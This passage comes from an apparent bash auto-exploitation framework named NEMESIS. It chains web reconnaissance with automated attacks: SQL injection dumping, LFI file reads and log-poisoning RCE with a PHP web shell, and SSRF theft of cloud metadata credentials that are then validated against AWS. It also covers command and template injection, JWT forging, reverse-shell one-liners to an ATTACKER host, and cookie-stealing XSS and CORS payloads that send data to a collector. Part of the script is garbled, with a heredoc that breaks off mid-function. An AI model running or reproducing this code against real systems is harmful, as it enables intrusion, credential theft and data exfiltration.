  log OK "Specs: $(cnt "$O/openapi_specs.txt") | GraphQL: $(cnt "$O/graphql_endpoints.txt") | introspection open: $(cnt "$O/graphql_introspection.txt")"
}

# ─────────────────────────── MOD 11 — PARAM FUZZ ───────────────────────────
mod_param_fuzz() {
  [[ "$M_PMF" == false && "$G_FULL" == false ]] && return
  step "11 PARAM FUZZ — hidden params · type confusion · JSON mutation"
  local O="$W/vulns/param_fuzz"; mkdir -p "$O"
  local PW="/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"
  [[ ! -f "$PW" ]] && PW="/usr/share/wordlists/dirb/common.txt"
  has ffuf && {
    head -30 "$W/subs/status_200.txt" 2>/dev/null | while IFS= read -r u; do
      local base_url="${u%%\?*}" s; s=$(sn "$u")
      ffuf -u "${base_url}?FUZZ=nemesis_probe" -w "$PW" -t 50 -mc 200,201,302 -fs 0 \
        -of json -o "$O/ffuf_get_${s}.json" -s 2>/dev/null || true
    done
    find "$O" -name 'ffuf_get_*.json' -size +10c | xargs -I{} jq -r '.results[]?.input.FUZZ' {} 2>/dev/null | sort -u > "$O/hidden_params.txt" || true
    u "$O/hidden_params.txt"; }
  local TM=("0" "-1" "999999999" "null" "undefined" "true" "false" "[]" "{}" "NaN" "Infinity" "%00" "'OR 1=1--" "<script>" "{{7*7}}" "../etc/passwd")
  while IFS= read -r u; do
    for m in "${TM[@]}"; do
      local t; t=$(echo "$u" | qsreplace "$m" 2>/dev/null)
      probe "$t"
      if [[ "$RC" == "500" ]] || echo "$RB" | grep -qiE "(stack trace|typeerror|valueerror|null pointer|parse error|invalid.*type|expected.*number)"; then
        echo "TYPE_CONFUSION [${RC}] (${m}): $t" >> "$O/type_confusion.txt"
      fi
    done
  done < <(head -40 "$W/urls/params.txt" 2>/dev/null)
  u "$O/type_confusion.txt"
  local JP=('{"__proto__":{"admin":true}}' '{"$gt":"","$ne":""}' '{"role":"admin","is_admin":true,"privilege":9999}' '{"a":"b","c":"d","e":"f","g":"h","i":"j","k":"l","m":"n","o":"p","q":"r","s":"t","u":"v","w":"x","y":"z"}')
  local JL=("prototype_pollution" "nosqli" "mass_assign" "large_payload")
  while IFS= read -r u; do
    for i in "${!JP[@]}"; do
      local b c; b=$(curlx -X POST -H "Content-Type: application/json" -d "${JP[$i]}" -- "$u" 2>/dev/null | head -c 2000 || true)
      c=$(curlx -X POST -H "Content-Type: application/json" -d "${JP[$i]}" -o /dev/null -w '%{http_code}' -- "$u" 2>/dev/null || echo 000)
      if [[ "$c" =~ ^(200|201)$ ]] || echo "$b" | grep -qiE "(admin|success|token|privilege|elevated)"; then
        echo "JSON_MUTATION [${JL[$i]}] [${c}]: $u" >> "$O/json_hits.txt"; log H "JSON mutation (verified): ${JL[$i]} @ $u"
      fi
    done
  done < <(head -30 "$W/urls/params.txt" 2>/dev/null)
  u "$O/json_hits.txt"
  log OK "Hidden params: $(cnt "$O/hidden_params.txt") | type confusion: $(cnt "$O/type_confusion.txt") | JSON hits: $(cnt "$O/json_hits.txt")"
}

# ─────────────────────────── MOD 12 — SCREENSHOTS ───────────────────────────
mod_screenshots() {
  has gowitness || return
  step "12 Screenshots (gowitness)"
  gowitness scan file -f "$W/subs/live.txt" --screenshot-path "$W/screenshots" --threads 10 --timeout 15 --db-path "$W/screenshots/gowitness.sqlite3" 2>/dev/null || true
  log OK "Screenshots → $W/screenshots/"
}

# ─────────────────────────── AUTO-EXPLOIT ENGINE ───────────────────────────
exp_sqli() { local url=$1 out="$EX/sqli/$(sn "$url")"; mkdir -p "$out"
  log H "EXPLOIT SQLi → dump: $url"
  local args=(--batch --random-agent --threads=5 --timeout=15 --retries=1 --tamper=space2comment,randomcase
              --no-cast --smart --ignore-code=403 --answers="follow=N,reduce=Y,normalize=Y,proceed=C,test=Y,integer=Y"
              --output-dir="$out")
  [[ "$EXP_DUMP" == true ]] && args+=(--dump) || args+=(--banner --current-user --dbs)
  timeout "$EXP_SQLI_T" sqlmap -u "$url" "${args[@]}" ${COOKIE:+--cookie="$COOKIE"} ${PROXY:+--proxy="$PROXY"} >/dev/null 2>&1 || true
  find "$out" -name '*.csv' -size +0c | while IFS= read -r f; do
    grep -v '^Target' "$f" | grep -v '^$' >> "$EX/sqli/dumps.txt" || true
  done
  u "$EX/sqli/dumps.txt"
  log H "SQLi artifacts → $out (rows: $(cnt "$EX/sqli/dumps.txt"))"
}
exp_lfi() { local url=$1 out="$EX/lfi/$(sn "$url")"; mkdir -p "$out"
  log H "EXPLOIT LFI → file read + log-poison RCE: $url"
  local base; base=$(echo "$url" | grep -oP 'https?://[^/]+')
  local FILES=(/etc/passwd /etc/hostname /proc/self/environ /proc/self/cmdline /etc/shadow /etc/nginx/nginx.conf /var/www/html/index.php)
  for f in "${FILES[@]}"; do
    local t; t=$(echo "$url" | qsreplace "../../../../..$f" 2>/dev/null)
    local b; b=$(curlx -- "$t" 2>/dev/null || true)
    echo "=== $f ===" >> "$out/reads.txt"; echo "$b" | head -c 1500 >> "$out/reads.txt"; echo >> "$out/reads.txt"
  done
  local t2; t2=$(echo "$url" | qsreplace "php://filter/convert.base64-encode/resource=/etc/passwd" 2>/dev/null)
  local b64; b64=$(curlx -- "$t2" 2>/dev/null | head -c 2000 || true)
  echo "$b64" | base64 -d 2>/dev/null | grep -qE "root:x:" && { echo "BASE64_READ_OK|$t2" >> "$out/reads.txt"; log H "LFI base64 read confirmed"; }
  local shell='<?php system($_GET["c"]); ?>'
  [[ -n "$base" ]] && curlx -A "$shell" -- "${base}/__nemesis_log_poison" -o /dev/null 2>/dev/null || true
  for lf in /var/log/nginx/access.log /var/log/apache2/access.log /var/log/apache2/error.log /proc/self/environ; do
    local t3; t3=$(echo "$url" | qsreplace "$lf" 2>/dev/null)
    local r; r=$(curlx -- "${t3}&c=id" 2>/dev/null || true)
    if echo "$r" | grep -qE "uid=[0-9]+"; then
      echo "RCE_LOG_POISON|${t3}&c=id|$r" >> "$out/rce.txt"
      log H "RCE via log poisoning: ${t3}&c=id"
      break
    fi
  done
  u "$out/reads.txt" "$out/rce.txt"
}
exp_ssrf() { local url=$1 out="$EX/ssrf/$(sn "$url")"; mkdir -p "$out"
  log H "EXPLOIT SSRF → metadata harvest: $url"
  for ep in "http://169.254.169.254/latest/meta-data/" "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
            "http://metadata.google.internal/computeMetadata/v1/?recursive=true" "http://100.100.100.200/latest/meta-data/"; do
    local t; t=$(echo "$url" | qsreplace "$ep" 2>/dev/null)
    local b; b=$(curlx -L -- "$t" 2>/dev/null | head -c 3000 || true)
    echo "=== $ep ===" >> "$out/metadata.txt"; echo "$b" >> "$out/metadata.txt"
  done
  local role; role=$(curlx -L -- "$(echo "$url" | qsreplace 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' 2>/dev/null)" 2>/dev/null | head -1 | tr -d '\r\n' || true)
  if [[ -n "$role" && "$role" != *"<"* ]]; then
    local creds; creds=$(curlx -L -- "$(echo "$url" | qsreplace "http://169.254.169.254/latest/meta-data/iam/security-credentials/$role" 2>/dev/null)" 2>/dev/null || true)
    echo "$creds" > "$out/aws_creds_$role.json"
    log H "AWS role '$role' credentials → $out/aws_creds_$role.json"
    if [[ "$F_VERIFY_KEYS" == true && -n "$(command -v aws)" ]]; then
      local ak sk; ak=$(echo "$creds" | jq -r .AccessKeyId 2>/dev/null); sk=$(echo "$creds" | jq -r .SecretAccessKey 2>/dev/null)
      AWS_ACCESS_KEY_ID="$ak" AWS_SECRET_ACCESS_KEY="$sk" AWS_DEFAULT_REGION=us-east-1 \
        aws sts get-caller-identity 2>/dev/null > "$out/validated_identity.json" && log H "VALIDATED AWS identity → $out/validated_identity.json"
    fi
  fi
  u "$out/metadata.txt"
}
exp_cmdi() { local url=$1 out="$EX/cmdi/$(sn "$url")"; mkdir -p "$out"
  log H "EXPLOIT CMDi → command echo-back: $url"
  local -a WRAPS=(";%s" "|%s" '`%s`' '$(%s)' "&&%s")
  for cmd in "id" "whoami" "uname -a" "cat /etc/hostname"; do
    for wrap in "${WRAPS[@]}"; do
      local payload; payload=$(printf "$wrap" "$cmd")
      local t; t=$(echo "$url" | qsreplace "$payload" 2>/dev/null)
      local b; b=$(curlx -- "$t" 2>/dev/null || true)
      if echo "$b" | grep -qE "(uid=[0-9]+|^[a-z_]+$|Linux [a-z0-9])"; then
        echo "CMD_OK|$t|$(echo "$b" | head -c 300)" >> "$out/confirmed.txt"
        log H "Command execution: $cmd → $(echo "$b" | head -c 120 | tr '\n' ' ')"
        break 2
      fi
    done
  done
  u "$out/confirmed.txt"
  [[ "$F_SHELL" == true ]] && cat > "$out/shell_options.txt" <<'SHL'
# Reverse shells (manual use, in-scope only):
# bash:    bash -i >& /dev/tcp/ATTACKER/PORT 0>&1
# nc:      nc -e /bin/sh ATTACKER PORT
# python:  python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
# php:     php -r '$sock=fsockopen("ATTACKER",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
SHL
}
exp_ssti() { local url=$1 eng=$2 out="$EX/ssti/$(sn "$url")"; mkdir -p "$out"
  log H "EXPLOIT SSTI ($eng) → RCE probe: $url"
  local payload=""
  case "$eng" in
    Jinja2) payload='{{cycler.__init__.__globals__.os.popen("id").read()}}' ;;
    Twig) payload='{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}' ;;
    Freemarker) payload='<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}' ;;
    Velocity) payload='#set($e="x")$e.getClass().forName("java.lang.Runtime").getRuntime().exec("id")' ;;
    ERB) payload='<%= system("id") %>' ;;
    *) payload='{{7*7}}' ;;
  esac
  local t; t=$(echo "$url" | qsreplace "$payload" 2>/dev/null)
  local b; b=$(curlx -- "$t" 2>/dev/null || true)
  if echo "$b" | grep -qE "uid=[0-9]+"; then
    echo "SSTI_RCE|$t|$b" >> "$out/rce.txt"; log H "SSTI → RCE: $t"
  else echo "SSTI_CONFIRMED_NO_RCE|$t" >> "$out/notes.txt"; fi
  u "$out/rce.txt" "$out/notes.txt"
}
exp_xss() { local url=$1 payload=$2 out="$EX/xss/$(sn "$url")"; mkdir -p "$out"
  log H "EXPLOIT XSS → PoC artifact: $url"
  cat > "$out/poc.html" <<POCH
<!DOCTYPE html><html><head><title>XSS PoC</title></head><body>
<h2>Reflected XSS — VERIFIED</h2>
<p>Target: <a href="$url">$url</a></p>
<p>Payload: <code>$(echo "$payload" | sed 's/&/\&amp;/g;s/</\&lt;/g')</code></p>
<p>Cookie-steal (place in param):</p>
<code><script>fetch('${COLLECTOR:-https://COLLECTOR.EXAMPLE/x}?c='+document.cookie)</script></code>
</body></html>
POCH
  log H "XSS PoC → $out/poc.html"
}
exp_idor() { local url=$1 out="$EX/idor/$(sn "$url")"; mkdir -p "$out"
  log H "EXPLOIT IDOR → neighbor sweep: $url"
  local ids pname pval; ids=$(echo "$url" | grep -oE '[?&][a-zA-Z0-9_]+=[0-9]+' | head -1)
  [[ -z "$ids" ]] && return
  pname="${ids%%=*}"; pname="${pname#*[?&]}"; pval="${ids##*=}"
  for n in 1 2 3 "$((pval+1))" "$((pval-1))" "$((pval+100))"; do
    local t; t=$(echo "$url" | sed "s/${pname}=${pval}/${pname}=${n}/")
    local b; b=$(curlx -- "$t" 2>/dev/null | head -c 1500 || true)
    echo "=== id=${n} ===" >> "$out/sweep.txt"; echo "$b" >> "$out/sweep.txt"
    echo "$b" | grep -qiE "email|ssn|password|token|address|phone" && {
      echo "DIFF|$t" >> "$out/cross_user_candidates.txt"; log H "Cross-user data signal: $t"; }
  done
  cat > "$out/README.txt" <<RDE
IDOR verification (2 accounts):
1. Burp → Autorize → low-priv cookie → replay $url with other IDs
2. Diff $out/sweep.txt for cross-account data
RDE
  u "$out/sweep.txt" "$out/cross_user_candidates.txt"
}
exp_bac() { local url=$1 out="$EX/bac/$(sn "$url")"; mkdir -p "$out"
  log H "EXPLOIT BAC → role-injection + method switch: $url"
  local -a P=("role=admin" "is_admin=true" "isAdmin=true" "user_type=admin" "privilege=9999" "level=1" "scope=admin")
  for p in "${P[@]}"; do
    local t; t=$(setparam "$url" "${p%%=*}" "${p#*=}")
    local b; b=$(curlx -X POST -d "$p" -- "$t" 2>/dev/null | head -c 800 || true)
    echo "$b" | grep -qiE "(admin|success|granted|true)" && {
      echo "ROLE_HIT|$p|$t" >> "$out/role_inject.txt"; log H "Role injection signal: $p @ $t"; }
  done
  for m in POST PUT PATCH DELETE OPTIONS; do
    local c; c=$(curlx -X "$m" -o /dev/null -w '%{http_code}' -- "$url" 2>/dev/null || echo 000)
    [[ "$c" =~ ^(200|201|204)$ ]] && { echo "METHOD_OK|$m|$url" >> "$out/method.txt"; log H "Method bypass $m → $c: $url"; }
  done
  u "$out/role_inject.txt" "$out/method.txt"
}
exp_jwt() { local jwt=$1 out="$EX/jwt/$(sn "$jwt")"; mkdir -p "$out"
  log H "EXPLOIT JWT → crack + forge: ${jwt:0:40}…"
  echo "$jwt" > "$out/token.txt"
  local hdr; hdr=$(echo "$jwt" | cut -d. -f1 | base64 -d 2>/dev/null || true)
  if echo "$hdr" | grep -qi '"alg"[^,]*"none"'; then
    local p h2; p=$(echo "$jwt" | cut -d. -f2)
    h2=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
    echo "${h2}.${p}." > "$out/alg_none_forged.txt"
    log H "alg:none forged → $out/alg_none_forged.txt"
  fi
  [[ -f "$HOME/tools/jwt_tool/jwt_tool.py" ]] && \
    python3 "$HOME/tools/jwt_tool/jwt_tool.py" "$jwt" -C -d /usr/share/seclists/Passwords/rockyou.txt 2>/dev/null > "$out/crack.txt" || true
  grep -qiE "KEY FOUND|secret" "$out/crack.txt" 2>/dev/null && log H "JWT
  cat >> /usr/local/bin/bug <<'NEMESIS_EOF'
grep -qiE "KEY FOUND|secret" "$out/crack.txt" 2>/dev/null && log H "JWT cracked → $out/crack.txt"
  u "$out/crack.txt" "$out/alg_none_forged.txt"
}

# ─────────────────────────── AUTO-EXPLOIT ENGINE (cont.) ───────────────────────────
exp_takeover() { local host=$1 out="$EX/takeover/$(sn "$host")"; mkdir -p "$out"
  log H "EXPLOIT subdomain takeover → claimability: $host"
  local b; b=$(curlx -- "http://$host" -o /dev/null 2>/dev/null || true)
  probe "http://$host"
  for sig in "There isn't a GitHub Pages site here" "NoSuchBucket" "NoSuchWebsiteConfiguration" \
             "NXDOMAIN" "The specified bucket does not exist" "No such app" "This page is not live" \
             "The page you are looking for is not found" "project not found" "No site found" \
             "Domain is not configured" "No such project" "is not a registered namespace"; do
    echo "$RB" | grep -qi "$sig" && {
      echo "CLAIMABLE|$host|$sig" >> "$out/claimable.txt"
      log H "TAKEOVER CLAIMABLE: $host (${sig:0:50})"
      break; }
  done
  u "$out/claimable.txt"
}
exp_csrf() { local url=$1 out="$EX/csrf/$(sn "$url")"; mkdir -p "$out"
  log H "EXPLOIT CSRF → PoC form: $url"
  local origin; origin=$(echo "$url" | grep -oP 'https?://[^/]+')
  cat > "$out/poc.html" <<POCF
<!DOCTYPE html><html><body>
<form action="$url" method="POST" id="f">
  <input name="email" value="attacker@evil.com"><input name="role" value="admin">
</form><script>document.getElementById('f').submit();</script>
</body></html>
POCF
  # origin-header sanity check (CSRF protection evidence)
  local chk; chk=$(curlx -X POST -H "Origin: https://evil.example" -d "x=1" -o /dev/null -w '%{http_code}' -- "$url" 2>/dev/null || echo 000)
  [[ "$chk" =~ ^(200|201|204|302)$ ]] && echo "NO_ORIGIN_CHECK|$url|${chk}" >> "$out/no_origin_check.txt"
  u "$out/no_origin_check.txt"; log H "CSRF PoC → $out/poc.html"
}
exp_cors() { local url=$1 out="$EX/cors/$(sn "$url")"; mkdir -p "$out"
  log H "EXPLOIT CORS → origin reflection: $url"
  local o; o=$(echo "$url" | grep -oP 'https?://[^/]+')
  local b; b=$(curlx -H "Origin: https://evil.example" -D - -o /dev/null -- "$url" 2>/dev/null || true)
  if echo "$b" | grep -qi "Access-Control-Allow-Origin: https://evil.example"; then
    echo "REFLECTED|$url" >> "$out/reflected.txt"
    echo "$b" | grep -i "Access-Control-Allow-Credentials" | grep -qi true && echo "WITH_CREDENTIALS|$url" >> "$out/reflected.txt"
    cat > "$out/poc.html" <<POCR
<!DOCTYPE html><html><body><script>
fetch('$url',{credentials:'include'}).then(r=>r.text()).then(d=>new Image().src='${COLLECTOR:-https://COLLECTOR.EXAMPLE/x}?d='+btoa(d));
</script></body></html>
POCR
    log H "CORS reflection verified → $out/poc.html"
  fi
  u "$out/reflected.txt"
}
exp_redirect() { local url=$1 out="$EX/redirect/$(sn "$url")"; mkdir -p "$out"
  log H "EXPLOIT open redirect → PoC: $url"
  local t; t=$(echo "$url" | qsreplace "https://evil.example" 2>/dev/null)
  local loc; loc=$(curlx -s -o /dev/null -w '%{redirect_url}' -- "$t" 2>/dev/null || true)
  if [[ "$loc" == https://evil.example* ]]; then
    echo "OPEN_REDIRECT|$url|$loc" >> "$out/confirmed.txt"
    cat > "$out/poc.html" <<POCR
<a href="$t">Click — redirects to evil.example (phishing)</a>
POCR
    log H "Open redirect verified → $out/poc.html"
  fi
  u "$out/confirmed.txt"
}

# ─────────────────────────── EXPLOIT ORCHESTRATOR ───────────────────────────
run_exploits() {
  step "EXPLOIT — auto chain: verify → dedupe → weaponize"
  [[ "$F_NO_EXPLOIT" == true ]] && { log W "skipping auto-exploit (--no-exploit)"; return; }
  mkdir -p "$EX"
  local i=0 total=${#EXPLOITS[@]}
  for row in "${EXPLOITS[@]+"${EXPLOITS[@]}"}"; do
    i=$((i+1)); IFS=$'\t' read -r sev kind data <<< "$row"
    log S "Exploit $i/$total — [$sev] $kind"
    case "$kind" in
      sqli)     exp_sqli "$data" ;;
      lfi)      exp_lfi "$data" ;;
      ssrf)     exp_ssrf "$data" ;;
      cmdi)     exp_cmdi "$data" ;;
      ssti)     local eng; eng=$(echo "$data" | cut -d'|' -f1)
                exp_ssti "$(echo "$data" | cut -d'|' -f2-)" "$eng" ;;
      xss)      local pl; pl=$(echo "$data" | cut -d'|' -f1)
                exp_xss "$(echo "$data" | cut -d'|' -f2-)" "$pl" ;;
      idor)     exp_idor "$data" ;;
      bac)      exp_bac "$data" ;;
      jwt)      exp_jwt "$data" ;;
      takeover) exp_takeover "$data" ;;
      csrf)     exp_csrf "$data" ;;
      cors)     exp_cors "$data" ;;
      redirect) exp_redirect "$data" ;;
    esac
    EXPLOIT_COUNT=$((EXPLOIT_COUNT+1))
  done
  log OK "Auto-exploit queue drained ($EXPLOIT_COUNT rounds). Artifacts → $EX/"
}

# ─────────────────────────── REPORTING ───────────────────────────
findings_snapshot() { local f
  for f in "$W"/vulns/*.txt "$W"/api/*.txt; do [[ -f "$f" ]] && cat "$f"; done | sort -u; }

gen_md_report() {
  local RPT="$W/reports/report.md"
  { echo "# NEMESIS v$VERSION — $DOMAIN"
    echo
    echo "Generated: $(date '+%F %T') | Elapsed: $(( ($(date +%s)-START)/60 ))m"
    echo
    echo "## Verified Findings (CRITICAL/HIGH)"
    echo '```'
    findings_snapshot | grep -E "CRITICAL|HIGH" || echo "(none)"
    echo '```'
    echo "## Exploit Artifacts"
    echo '```'
    find "$EX" -type f 2>/dev/null | sed "s|$W/||" | sort
    echo '```'
    echo "## Medium (review)"
    echo '```'
    cat "$W/reports/review_medium.txt" 2>/dev/null || echo "(none)"
    echo '```'
    echo "## Counters"
    local s; s=$(find "$W/vulns" -name '*.txt' -exec cat {} + 2>/dev/null | wc -l | tr -d ' ')
    echo "- unique verified findings: $s"
    echo "- exploit rounds: $EXPLOIT_COUNT"
    echo "- hosts: $(cnt "$W/subs/live.txt" 2>/dev/null)"
    echo "- URLs: $(cnt "$W/urls/all.txt" 2>/dev/null)"
    echo "- JS paths: $(cnt "$W/js/paths/all.txt" 2>/dev/null)"
  } > "$RPT"
  log OK "report → $RPT"
}
gen_html_report() {
  local RPT="$W/reports/report.html"
  local rows=""
  while IFS= read -r line; do
    local esc; esc=$(echo "$line" | sed 's/&/\&amp;/g;s/</\&lt;/g;s/>/\&gt;/g')
    local sev; sev=$(echo "$line" | cut -d'|' -f1)
    local cls; case "$sev" in CRITICAL) cls=crit;; HIGH) cls=high;; MEDIUM) cls=med;; *) cls=info;; esac
    rows+="<tr class=\"$cls\"><td>$sev</td><td>$esc</td></tr>"
  done < <(findings_snapshot)
  local arts; arts=$(find "$EX" -type f 2>/dev/null | sed "s|$W/||" | sort | sed 's|^|<li>|;s|$|</li>|')
  cat > "$RPT" <<HTM
<!DOCTYPE html><html><head><meta charset="utf-8">
<title>NEMESIS v$VERSION — $DOMAIN</title>
<style>
body{font-family:monospace;background:#0d1117;color:#c9d1d9;margin:2em}
h1{color:#58a6ff}.crit{color:#ff7b72}.high{color:#f0883e}.med{color:#d29922}.info{color:#8b949e}
table{border-collapse:collapse;width:100%}td,th{border:1px solid #30363d;padding:6px 10px;text-align:left}
th{background:#161b22;color:#58a6ff}.box{background:#161b22;border:1px solid #30363d;padding:1em;border-radius:6px;margin:1em 0}
</style></head><body>
<h1>NEMESIS v$VERSION — $DOMAIN</h1>
<p>$(date '+%F %T') · elapsed $(( ($(date +%s)-START)/60 ))m · hosts $(cnt "$W/subs/live.txt" 2>/dev/null) · urls $(cnt "$W/urls/all.txt" 2>/dev/null)</p>
<div class="box"><h3>Verified findings</h3><table><tr><th>Severity</th><th>Finding</th></tr>$rows</table></div>
<div class="box"><h3>Exploit artifacts</h3><ul>$arts</ul></div>
</body></html>
HTM
  log OK "report → $RPT"
}
gen_report() {
  step "REPORT — findings · review_medium · md + html"
  mkdir -p "$W/reports"
  : > "$W/reports/findings.txt"; : > "$W/reports/review_medium.txt"
  while IFS= read -r line; do
    case "$line" in
      CRITICAL*|HIGH*)   echo "$line" >> "$W/reports/findings.txt" ;;
      MEDIUM*)           [[ "$F_STRICT" == true ]] && echo "$line" >> "$W/reports/findings.txt" \
                                                    || echo "$line" >> "$W/reports/review_medium.txt" ;;
    esac
  done < <(findings_snapshot)
  u "$W/reports/findings.txt" "$W/reports/review_medium.txt"
  gen_md_report; gen_html_report
  log OK "findings: $(cnt "$W/reports/findings.txt") | medium review: $(cnt "$W/reports/review_medium.txt")"
  log S "════════════ DONE — $DOMAIN ════════════"
  echo -e "${G}Reports:${N}  $W/reports/report.html  |  $W/reports/report.md"
  echo -e "${G}Findings:${N}  $W/reports/findings.txt  (mediums → review_medium.txt)"
  echo -e "${G}Exploits:${N}  $EX/"
}

# ─────────────────────────── PIPELINE STAGES ───────────────────────────
stage_urls() {
  step "URLS — crawl & harvest (katana/wayback/gau/hakrawler)"
  mkdir -p "$W/urls" "$W/js"
  local raw="$W/urls/raw_all.txt"
  : > "$raw"
  if has katana; then
    log I "katana crawl…"
    timeout "$T_KATANA" katana -list "$W/subs/live.txt" -d "$D_KATANA" -jc -kf all -silent \
      -H "User-Agent: $(ua)" ${COOKIE:+-H "Cookie: $COOKIE"} -o "$W/urls/katana.txt" 2>/dev/null || true
    cat "$W/urls/katana.txt" >> "$raw" 2>/dev/null
  fi
  for h in "${A[@]+"${A[@]}"}"; do :; done
  if has gau; then gau --threads 10 --subs "$DOMAIN" 2>/dev/null >> "$raw" || true; fi
  if has waybackurls; then echo "$DOMAIN" | waybackurls 2>/dev/null >> "$raw" || true; fi
  if has hakrawler; then
    cat "$W/subs/live.txt" | hakrawler -d 2 -u -insecure 2>/dev/null >> "$raw" || true
  fi
  u "$raw"
  grep -E '^https?://' "$raw" | grep -Fv -e '.png' -e '.jpg' -e '.jpeg' -e '.gif' -e '.svg' -e '.ico' \
    -e '.css' -e '.woff' -e '.woff2' -e '.ttf' -e '.eot' -e '.pdf' -e '.zip' -e '.gz' -e '.mp4' -e '.mp3' \
    -e '.webm' -e '.avi' -e '.mov' -e '.map' -e '.min.js' -e '.js.map' | sort -u > "$W/urls/all.txt"
  grep -E '\?[^=]+=' "$W/urls/all.txt" | sort -u > "$W/urls/params.txt"
  grep -E '\.(js|mjs)([?#]|$)' "$W/urls/all.txt" | sort -u > "$W/urls/js_raw.txt"
  log OK "URLs: $(cnt "$W/urls/all.txt") | with params: $(cnt "$W/urls/params.txt") | js: $(cnt "$W/urls/js_raw.txt")"
}

stage_js_paths() {
  step "JS — download · extract paths ONLY · dedupe"
  mkdir -p "$W/js/paths" "$W/js/raw"
  local src="$W/urls/js_raw.txt"
  [[ -s "$src" ]] && cat "$src" >> "$W/js/paths/input.txt"
  cat "$W/subs/live.txt" | sed 's|/$||;s|$|/|' >> "$W/js/paths/input.txt" 2>/dev/null
  # discover common JS entry points
  while IFS= read -r base; do
    for p in /static/js/main.js /assets/js/app.js /js/app.js /build/bundle.js /static/js/bundle.js \
             /dist/app.js /public/js/main.js /wp-content/themes/*/js/*.js; do
      probe "${base}${p}"
      [[ "$RC" == "200" ]] && echo "${base}${p}" >> "$W/js/paths/input.txt"
    done
  done < <(head -5 "$W/subs/live.txt" 2>/dev/null)
  u "$W/js/paths/input.txt"
  local i=0; while IFS= read -r js; do
    i=$((i+1)); local f="$W/js/raw/$(sn "$js").js"
    [[ -s "$f" ]] && continue
    curlx -- "$js" -o "$f" 2>/dev/null || true
    [[ $(wc -c < "$f" 2>/dev/null || echo 0) -lt 8 ]] && rm -f "$f"
    [[ $((i % 25)) -eq 0 ]] && log I "js downloaded: $i"
  done < "$W/js/paths/input.txt"
  local PY="$W/.js_paths.py"
  cat > "$PY" <<'JPY'
import os,re,sys
PATHS=set()
DROP=("endpoint","scheme","host")
for f in sys.argv[1:]:
    if not os.path.isfile(f): continue
    try: s=open(f,encoding="utf-8",errors="ignore").read()
    except: continue
    for m in re.finditer(r'["\'](/[^"\']{2,200})["\']',s):
        p=m.group(1)
        if p.startswith("//"): continue
        if re.search(r'\.(png|jpe?g|gif|svg|ico|css|woff2?|ttf|eot|map|mp[34]|webm|zip|gz|pdf)$',p,re.I): continue
        if re.search(r'(node_modules|webpack|\.min\.|polyfill|vendor|bootstrap|jquery)',p,re.I): continue
        p=p.split("?")[0].split("#")[0]
        if len(p)<3 or p in ("/","//"): continue
        PATHS.add(p)
for p in sorted(PATHS): print(p)
JPY
  find "$W/js/raw" -name '*.js' -size +8c | xargs -r python3 "$PY" 2>/dev/null | sort -u > "$W/js/paths/all.txt" || true
  u "$W/js/paths/all.txt"
  # attach paths to hosts for live probing
  local HOST; HOST=$(head -1 "$W/subs/live.txt" 2>/dev/null)
  if [[ -n "$HOST" ]]; then
    sed "s|^|$HOST|" "$W/js/paths/all.txt" | sort -u > "$W/urls/js_paths_urls.txt"
  fi
  log OK "JS files: $(cnt "$W/js/paths/input.txt") | unique paths: $(cnt "$W/js/paths/all.txt")"
}

stage_fuzz() {
  step "FUZZ — ffuf content discovery (verified, deduped)"
  mkdir -p "$W/vulns/fuzz"
  local WLD="/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt"
  [[ ! -f "$WLD" ]] && WLD="/usr/share/seclists/Discovery/Web-Content/common.txt"
  [[ ! -f "$WLD" ]] && { log W "no seclists — skipping fuzz"; return; }
  local i=0
  while IFS= read -r base; do
    i=$((i+1)); local s; s=$(sn "$base")
    ffuf -u "${base%/}/FUZZ" -w "$WLD" -t 60 -mc 200,201,204,301,302,307,401,403,500 \
      -ac -s -of json -o "$W/vulns/fuzz/ffuf_${s}.json" 2>/dev/null || true
    [[ $((i % 5)) -eq 0 ]] && log I "ffuf hosts: $i"
  done < <(head -8 "$W/subs/live.txt" 2>/dev/null)
  find "$W/vulns/fuzz" -name 'ffuf_*.json' -size +10c | xargs -r jq -r '.results[]? | select(.status==200 or .status==301 or .status==302 or .status==401 or .status==403) | .status' {} 2>/dev/null | sort -u > /dev/null || true
  find "$W/vulns/fuzz" -name 'ffuf_*.json' -size +10c | xargs -r jq -r '.results[]?.input.FUZZ' {} 2>/dev/null | sort -u > "$W/vulns/fuzz/dirs.txt" || true
  u "$W/vulns/fuzz/dirs.txt"
  log OK "fuzzed dirs (unique): $(cnt "$W/vulns/fuzz/dirs.txt")"
}

stage_nuclei() {
  step "NUCLEI — vuln scan (dedupe by template+host)"
  mkdir -p "$W/vulns/nuclei"
  local seen="$W/vulns/nuclei/.seen"; : > "$seen"
  nuclei -l "$W/subs/live.txt" -t "${NUC_TEMPLATES[@]:-}" -rl "$R_NUCLEI" -timeout "$T_NUCLEI" \
    -severity critical,high,medium -o "$W/vulns/nuclei/raw.txt" \
    -stats -silent ${COOKIE:+-H "Cookie: $COOKIE"} 2>/dev/null || true
  [[ -f "$W/vulns/nuclei/raw.txt" ]] && grep -vE '^\s*$' "$W/vulns/nuclei/raw.txt" | while IFS= read -r line; do
    local host tpl sev; host=$(echo "$line" | grep -oP '\[(https?://[^]]+)\]' | head -1 | tr -d '[]' || true)
    tpl=$(echo "$line" | grep -oP '\[[a-z0-9/_-]+\]$' | head -1 | tr -d '[]' || true)
    sev=$(echo "$line" | grep -oE '\[(critical|high|medium|low|info)\]' | head -1 | tr -d '[]' || echo info)
    local k="${host}||${tpl}"
    grep -qF "$k" "$seen" && continue
    echo "$k" >> "$seen"
    case "$sev" in
      critical) echo "CRITICAL|NUCLEI:${tpl}|$host" ;;
      high)     echo "HIGH|NUCLEI:${tpl}|$host" ;;
      medium)   echo "MEDIUM|NUCLEI:${tpl}|$host" ;;
      *)        echo "INFO|NUCLEI:${tpl}|$host" ;;
    esac >> "$W/vulns/nuclei/parsed.txt"
  done
  u "$W/vulns/nuclei/parsed.txt"
  while IFS='|' read -r sev kind host; do
